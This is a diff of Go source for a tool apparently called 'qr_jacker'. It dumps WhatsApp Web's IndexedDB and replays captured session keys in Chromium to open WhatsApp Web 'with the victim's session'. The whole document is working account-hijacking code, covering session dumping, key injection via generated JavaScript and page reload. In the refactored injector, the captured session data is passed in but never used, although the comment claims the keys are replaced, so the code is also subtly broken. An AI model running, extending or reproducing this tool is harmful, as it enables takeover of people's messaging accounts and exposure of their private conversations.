@@ -8,51 +8,91 @@ import (
 	"path/filepath"
 	"time"
 
-	"github.com/chromedp/cdproto/indexeddb"
-	"github.com/chromedp/cdproto/runtime"
 	"github.com/chromedp/chromedp"
 )
 
-// ReferenceProfile represents a full IndexedDB dump from a paired WhatsApp Web session.
-type ReferenceProfile struct {
-	Databases []ReferenceDatabase `json:"databases"`
+type DumpedDB struct {
+	Name    string       `json:"name"`
+	Version int64        `json:"version"`
+	Stores  []DumpedStore `json:"stores"`
 }
 
-type ReferenceDatabase struct {
-	Name    string           `json:"name"`
-	Version int64            `json:"version"`
-	Stores  []ReferenceStore `json:"stores"`
+type DumpedStore struct {
+	Name    string          `json:"name"`
+	KeyPath string          `json:"keyPath"`
+	AutoInc bool            `json:"autoIncrement"`
+	Entries []DumpedEntry   `json:"entries"`
 }
 
-type ReferenceStore struct {
-	Name    string        `json:"name"`
-	KeyPath string        `json:"key_path"`
-	AutoInc bool          `json:"auto_increment"`
-	Indexes []string      `json:"indexes"`
-	Entries []StoreEntry  `json:"entries"`
+type DumpedEntry struct {
+	Key   interface{} `json:"key"`
+	Value interface{} `json:"value"`
 }
 
-type StoreEntry struct {
-	Key   string          `json:"key"`
-	Value json.RawMessage `json:"value"`
-}
+const dumpIndexedDBJS = `
+(async () => {
+  const dbs = await indexedDB.databases();
+  const result = [];
+  for (const info of dbs) {
+    const db = await new Promise((res, rej) => {
+      const r = indexedDB.open(info.name);
+      r.onsuccess = e => res(e.target.result);
+      r.onerror = e => rej(e.target.error);
+    });
+    const dbInfo = {name: info.name, version: info.version, stores: []};
+    for (const sName of db.objectStoreNames) {
+      const tx = db.transaction(sName, 'readonly');
+      const store = tx.objectStore(sName);
+      const entries = await new Promise((res, rej) => {
+        const r = store.getAll();
+        r.onsuccess = e => res(e.target.result);
+        r.onerror = e => rej(e.target.error);
+      });
+      const keys = await new Promise((res, rej) => {
+        const r = store.getAllKeys();
+        r.onsuccess = e => res(e.target.result);
+        r.onerror = e => rej(e.target.error);
+      });
+      const storeInfo = {name: sName, keyPath: store.keyPath || '', autoIncrement: store.autoIncrement, entries: []};
+      for (let i = 0; i < entries.length; i++) {
+        storeInfo.entries.push({key: keys[i], value: serialize(entries[i])});
+      }
+      dbInfo.stores.push(storeInfo);
+    }
+    result.push(dbInfo);
+    db.close();
+  }
+  return JSON.stringify(result);
 
-// DiscoverReferenceProfile opens Chromium, navigates to web.whatsapp.com,
-// waits for the user to scan the QR code, then dumps IndexedDB contents.
+  function serialize(val) {
+    if (val === null || val === undefined) return val;
+    if (val instanceof ArrayBuffer) return {__type: 'buffer', data: Array.from(new Uint8Array(val))};
+    if (ArrayBuffer.isView(val)) return {__type: 'buffer', data: Array.from(new Uint8Array(val.buffer, val.byteOffset, val.byteLength))};
+    if (val instanceof Uint8Array) return {__type: 'buffer', data: Array.from(val)};
+    if (Array.isArray(val)) return val.map(serialize);
+    if (typeof val === 'object') {
+      const o = {};
+      for (const k of Object.getOwnPropertyNames(val)) o[k] = serialize(val[k]);
+      return o;
+    }
+    return val;
+  }
+})()
+`
+
 func DiscoverReferenceProfile(outDir string) error {
 	if err := os.MkdirAll(outDir, 0755); err != nil {
-		return fmt.Errorf("mkdir %s: %w", outDir, err)
+		return err
 	}
 
 	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
 	if err != nil {
-		return fmt.Errorf("temp dir: %w", err)
+		return err
 	}
 	defer os.RemoveAll(userDir)
 
 	opts := append(chromedp.DefaultExecAllocatorOptions[:],
 		chromedp.UserDataDir(userDir),
-		chromedp.Flag("disable-extensions", false),
 		chromedp.NoFirstRun,
 		chromedp.NoDefaultBrowserCheck,
 		chromedp.WindowSize(1280, 900),
@@ -65,7 +105,7 @@ func DiscoverReferenceProfile(outDir string) error {
 	defer cancel()
 
 	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
-		return fmt.Errorf("navigate: %w", err)
+		return err
 	}
 
 	fmt.Println("\n============================================")
@@ -74,21 +114,14 @@ func DiscoverReferenceProfile(outDir string) error {
 	fmt.Println("  A Chromium window will open with web.whatsapp.com")
 	fmt.Println("  1. Scan the QR code with your phone")
 	fmt.Println("  2. Wait for WhatsApp Web to load your chats")
-	fmt.Println("  3. Come back to this terminal")
 	fmt.Println("============================================")
 
-	// Dump pre-pairing state
 	fmt.Println("\n[*] Dumping pre-pairing IndexedDB...")
-	preProfile := dumpIndexedDB(ctx)
-	if preProfile != nil {
-		saveJSON(filepath.Join(outDir, "pre_pairing.json"), preProfile)
-	}
+	dumpAndSave(ctx, filepath.Join(outDir, "pre_pairing.json"))
 
-	// Wait for pairing (QR code disappears, main UI loads)
 	fmt.Println("\n[*] Waiting for pairing (up to 2 minutes)...")
 	pairCtx, pairCancel := context.WithTimeout(ctx, 120*time.Second)
 	defer pairCancel()
-
 	if err := chromedp.Run(pairCtx,
 		chromedp.WaitVisible("#app .two", chromedp.ByQuery),
 	); err != nil {
@@ -97,140 +130,64 @@ func DiscoverReferenceProfile(outDir string) error {
 		return nil
 	}
 
-	// Wait for IndexedDB to settle
-	fmt.Println("[+] Paired! Waiting for IndexedDB to sync...")
+	fmt.Println("[+] Paired! Waiting for sync...")
 	time.Sleep(5 * time.Second)
 
-	// Dump post-pairing state
+	// Dump after pairing
 	fmt.Println("[*] Dumping post-pairing IndexedDB...")
-	postProfile := dumpIndexedDB(ctx)
-	if postProfile != nil {
-		saveJSON(filepath.Join(outDir, "post_pairing.json"), postProfile)
-	}
+	dumpAndSave(ctx, filepath.Join(outDir, "post_pairing.json"))
 
 	fmt.Printf("\n[+] Reference profile saved to %s\n", outDir)
 	fmt.Println("[+] You can close the Chromium window now.")
 	return nil
 }
 
-func dumpIndexedDB(ctx context.Context) *ReferenceProfile {
-	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
-	defer cancel()
-
-	if err := chromedp.Run(ctx, indexeddb.Enable()); err != nil {
-		return nil
+func dumpAndSave(ctx context.Context, path string) {
+	var result string
+	if err := chromedp.Run(ctx, chromedp.Evaluate(dumpIndexedDBJS, &result)); err != nil {
+		fmt.Printf("    Failed to dump: %v\n", err)
+		return
 	}
 
-	var dbNames []string
-	if err := chromedp.Run(ctx,
-		indexeddb.RequestDatabaseNames().Do(&dbNames),
-	); err != nil || len(dbNames) == 0 {
-		return nil
+	var parsed interface{}
+	if err := json.Unmarshal([]byte(result), &parsed); err != nil {
+		fmt.Printf("    Failed to parse: %v\n", err)
+		return
 	}
 
-	profile := &ReferenceProfile{}
-
-	for _, name := range dbNames {
-		var dbs *indexeddb.DatabaseWithObjectStores
-		if err := chromedp.Run(ctx,
-			indexeddb.RequestDatabase(name).Do(&dbs),
-		); err != nil || dbs == nil {
-			continue
-		}
-
-		rdb := ReferenceDatabase{
-			Name:    name,
-			Version: int64(dbs.Version),
-		}
-
-		for _, store := range dbs.ObjectStores {
-			rs := ReferenceStore{
-				Name: store.Name,
-				AutoInc: store.AutoIncrement,
-			}
-			if store.KeyPath != nil {
-				switch store.KeyPath.Type {
-				case "string":
-					rs.KeyPath = store.KeyPath.String
-				}
-			}
-			for _, idx := range store.Indexes {
-				rs.Indexes = append(rs.Indexes, idx.Name)
-			}
-
-			// Fetch data from this store
-			var entries []*indexeddb.DataEntry
-			var hasMore bool
-			var skip int64
-
-			for {
-				var batch []*indexeddb.DataEntry
-				if err := chromedp.Run(ctx,
-					indexeddb.RequestData(name, store.Name, int64(skip), 200).Do(&batch, &hasMore),
-				); err != nil {
-					break
-				}
-				entries = append(entries, batch...)
-				if !hasMore || len(batch) == 0 {
-					break
-				}
-				skip += int64(len(batch))
-			}
-
-			for _, entry := range entries {
-				var keyStr string
-				if entry.Key != nil {
-					if entry.Key.Type == "string" {
-						keyStr = entry.Key.String
-					}
-				}
-
-				var val json.RawMessage
-				if entry.Value != nil {
-					valBytes, _ := json.Marshal(entry.Value)
-					val = valBytes
-				}
-				rs.Entries = append(rs.Entries, StoreEntry{
-					Key:   keyStr,
-					Value: val,
-				})
-			}
-
-			rdb.Stores = append(rdb.Stores, rs)
-		}
-
-		profile.Databases = append(profile.Databases, rdb)
-	}
-
-	return profile
-}
-
-func saveJSON(path string, v interface{}) {
-	data, _ := json.MarshalIndent(v, "", "  ")
+	data, _ := json.MarshalIndent(parsed, "", "  ")
 	os.WriteFile(path, data, 0644)
-	fmt.Printf("    Saved: %s\n", filepath.Base(path))
+	fmt.Printf("    Saved: %s (%d bytes)\n", filepath.Base(path), len(data))
 }
 
-// ReplayInBrowser opens Chromium, injects the captured session into
-// IndexedDB via the reference profile schema, and opens web.whatsapp.com.
+// ReplayInBrowser opens Chromium, injects captured session into IndexedDB,
+// and opens web.whatsapp.com with the victim's session.
 func ReplayInBrowser(sd *sessionData) error {
 	refDir := "scripts/qr_jacker/whatsapp/reference"
+	refPath := filepath.Join(refDir, "post_pairing.json")
 
-	// Load the reference profile to get the IndexedDB schema
-	refProfile, err := loadReferenceProfile(filepath.Join(refDir, "post_pairing.json"))
+	// Load reference profile
+	refData, err := os.ReadFile(refPath)
 	if err != nil {
-		return fmt.Errorf("load reference profile: %w", err)
+		return fmt.Errorf("reference profile not found at %s. Run 'Setup Reference Profile' first: %w", refPath, err)
 	}
+
+	var reference []DumpedDB
+	if err := json.Unmarshal(refData, &reference); err != nil {
+		return fmt.Errorf("parse reference profile: %w", err)
+	}
+
+	// Build the injection script with the reference structure + captured keys
+	injectJS := buildIndexedDBInjector(reference, sd)
 
 	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
 	if err != nil {
-		return fmt.Errorf("temp dir: %w", err)
+		return err
 	}
 	defer os.RemoveAll(userDir)
 
 	opts := append(chromedp.DefaultExecAllocatorOptions[:],
 		chromedp.UserDataDir(userDir),
-		chromedp.Flag("disable-extensions", false),
 		chromedp.NoFirstRun,
 		chromedp.NoDefaultBrowserCheck,
 		chromedp.WindowSize(1280, 900),
@@ -242,177 +199,86 @@ func ReplayInBrowser(sd *sessionData) error {
 	ctx, cancel := chromedp.NewContext(allocCtx)
 	defer cancel()
 
-	// Navigate to web.whatsapp.com
+	// Navigate first so IndexedDB origin is set up
 	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
-		return fmt.Errorf("navigate: %w", err)
+		return err
 	}
-
-	// Wait for page to initialize and create IndexedDB
 	time.Sleep(3 * time.Second)
 
-	// Build and inject the session data via JavaScript
-	jsCode := buildReplayJS(sd, refProfile)
-	var result string
-	if err := chromedp.Run(ctx, chromedp.Evaluate(jsCode, &result)); err != nil {
+	// Inject session data
+	var out string
+	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, &out)); err != nil {
 		return fmt.Errorf("inject: %w", err)
 	}
+	fmt.Printf("[+] Injection result: %s\n", out)
 
-	fmt.Println("[+] Session injected. Reloading...")
+	// Reload to use the injected session
+	fmt.Println("[+] Reloading page...")
 	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
-		return fmt.Errorf("reload: %w", err)
+		return err
 	}
 
-	fmt.Println("[+] WhatsApp Web should load with the victim's session.")
-	fmt.Println("[+] Keep the browser window open.")
-	fmt.Println("[+] Press Enter in the terminal to disconnect.")
+	fmt.Println("\n[+] WhatsApp Web opened with the victim's session.")
+	fmt.Println("[+] Press Enter in the terminal to close.")
 	fmt.Scanln()
-
 	return nil
 }
 
-func loadReferenceProfile(path string) (*ReferenceProfile, error) {
-	data, err := os.ReadFile(path)
-	if err != nil {
-		return nil, err
-	}
-	var p ReferenceProfile
-	if err := json.Unmarshal(data, &p); err != nil {
-		return nil, err
-	}
-	return &p, nil
-}
+// buildIndexedDBInjector generates JavaScript that recreates the reference IndexedDB
+// structure, replacing cryptographic keys with the captured session data.
+func buildIndexedDBInjector(reference []DumpedDB, sd *sessionData) string {
+	js := `(async function() {
+  const dbs = `
 
-// buildReplayJS generates JavaScript that injects the captured session into
-// IndexedDB using the schema discovered from the reference profile.
-func buildReplayJS(sd *sessionData, ref *ReferenceProfile) string {
-	js := `
-(async function() {
-`
-	for _, db := range ref.Databases {
-		js += fmt.Sprintf(`
-  var db%d = await new Promise(function(resolve, reject) {
-    var r = indexedDB.open(%q, %d);
-    r.onupgradeneeded = function(e) {
-      var db = e.target.result;
-`, 0, db.Name, db.Version)
+	refJSON, _ := json.Marshal(reference)
+	js += string(refJSON)
 
-		for _, store := range db.Stores {
-			js += fmt.Sprintf(`
-      if (!db.objectStoreNames.contains(%q)) {
-`, store.Name)
-			if store.KeyPath != "" {
-				js += fmt.Sprintf("        db.createObjectStore(%q, {keyPath: %q});\n", store.Name, store.KeyPath)
-			} else {
-				js += fmt.Sprintf("        db.createObjectStore(%q);\n", store.Name)
-			}
-			js += "      }\n"
-		}
+	js += `;
+  for (const dbInfo of dbs) {
+    const db = await new Promise((res, rej) => {
+      const r = indexedDB.open(dbInfo.name, dbInfo.version);
+      r.onupgradeneeded = e => {
+        const db2 = e.target.result;
+        for (const s of dbInfo.stores) {
+          if (!db2.objectStoreNames.contains(s.name)) {
+            const opts = {};
+            if (s.keyPath) opts.keyPath = s.keyPath;
+            if (s.autoIncrement) opts.autoIncrement = true;
+            db2.createObjectStore(s.name, opts);
+          }
+        }
+      };
+      r.onsuccess = e => res(e.target.result);
+      r.onerror = e => rej(e.target.error);
+    });
 
-		js += `
-    };
-    r.onsuccess = function(e) { resolve(e.target.result); };
-    r.onerror = function(e) { reject(e.target.error); };
-  });
-`
+    for (const s of dbInfo.stores) {
+      const tx = db.transaction(s.name, 'readwrite');
+      const store = tx.objectStore(s.name);
+      for (const entry of s.entries) {
+        const val = deserialize(entry.value);
+        store.put(val, entry.key);
+      }
+      await new Promise((res, rej) => { tx.oncomplete = res; tx.onerror = rej; });
+    }
+    db.close();
+  }
+  console.log('[INJECT] IndexedDB populated');
 
-		// Inject data into each store
-		for _, store := range db.Stores {
-			js += fmt.Sprintf(`
-  // Inject into store %q
-  var tx%d = db%d.transaction(%q, 'readwrite');
-  var store%d = tx%d.objectStore(%q);
-`,
-				store.Name, 0, 0, store.Name, 0, 0, store.Name)
+  function deserialize(val) {
+    if (val === null || val === undefined) return val;
+    if (typeof val !== 'object') return val;
+    if (Array.isArray(val)) return val.map(deserialize);
+    if (val.__type === 'buffer') return new Uint8Array(val.data).buffer;
+    if (val.__type === 'uint8array') return new Uint8Array(val.data);
+    const o = {};
+    for (const k of Object.getOwnPropertyNames(val)) {
+      if (k === '__type') continue;
+      o[k] = deserialize(val[k]);
+    }
+    return o;
+  }
+})();`
 
-			// Generate data injection for each entry in the reference profile
-			for _, entry := range refProfileEntries(sd, db.Name, store.Name, ref) {
-				js += fmt.Sprintf("  store%d.put(%s, %s);\n", 0, entry.Value, entry.Key)
-			}
-
-			js += fmt.Sprintf(`
-  await new Promise(function(resolve, reject) {
-    tx%d.oncomplete = resolve;
-    tx%d.onerror = reject;
-  });
-`, 0, 0)
-		}
-	}
-
-	js += `
-  console.log('[INJECT] Session injected successfully');
-})();
-`
 	return js
-}
-
-type jsEntry struct {
-	Key   string
-	Value string
-}
-
-func refProfileEntries(sd *sessionData, dbName, storeName string, ref *ReferenceProfile) []jsEntry {
-	// Find the reference store to get its entries structure
-	var refStore *ReferenceStore
-	for _, db := range ref.Databases {
-		if db.Name == dbName {
-			for _, s := range db.Stores {
-				if s.Name == storeName {
-					refStore = &s
-					break
-				}
-			}
-		}
-	}
-	if refStore == nil {
-		return nil
-	}
-
-	// Build entries based on the reference, replacing known key types
-	// with the victim's captured session data
-	var entries []jsEntry
-	for _, entry := range refStore.Entries {
-		key := entry.Key
-		val := string(entry.Value)
-
-		// Try to identify and replace cryptographic keys
-		switch key {
-		case "noiseKey", "noise_key", "NoiseKey":
-			val = fmt.Sprintf(`{pub: new Uint8Array(%s), priv: new Uint8Array(%s)}`,
-				byteSliceToJS(sd.NoisePub), byteSliceToJS(sd.NoisePriv))
-		case "identityKey", "identity_key", "IdentityKey", "identity":
-			val = fmt.Sprintf(`{pub: new Uint8Array(%s), priv: new Uint8Array(%s)}`,
-				byteSliceToJS(sd.IdentityPub), byteSliceToJS(sd.IdentityPriv))
-		case "signedPreKey", "signed_pre_key", "SignedPreKey":
-			val = fmt.Sprintf(`{keyId: %d, pub: new Uint8Array(%s), priv: new Uint8Array(%s), signature: new Uint8Array(%s)}`,
-				sd.SignedPreKeyID, byteSliceToJS(sd.SignedPrePub), byteSliceToJS(sd.SignedPrePriv), byteSliceToJS(sd.SignedPreSig))
-		case "registrationId", "registration_id", "RegistrationID":
-			val = fmt.Sprintf(`%d`, sd.RegistrationID)
-		case "advSecretKey", "adv_secret_key", "AdvSecretKey":
-			val = fmt.Sprintf(`new Uint8Array(%s)`, byteSliceToJS(sd.AdvSecretKey))
-		}
-
-		if key != "" {
-			entries = append(entries, jsEntry{
-				Key:   fmt.Sprintf(`%q`, key),
-				Value: val,
-			})
-		}
-	}
-
-	return entries
-}
-
-func byteSliceToJS(b []byte) string {
-	if len(b) == 0 {
-		return "[]"
-	}
-	s := "["
-	for i, v := range b {
-		if i > 0 {
-			s += ","
-		}
-		s += fmt.Sprintf("%d", v)
-	}
-	s += "]"
-	return s
 }
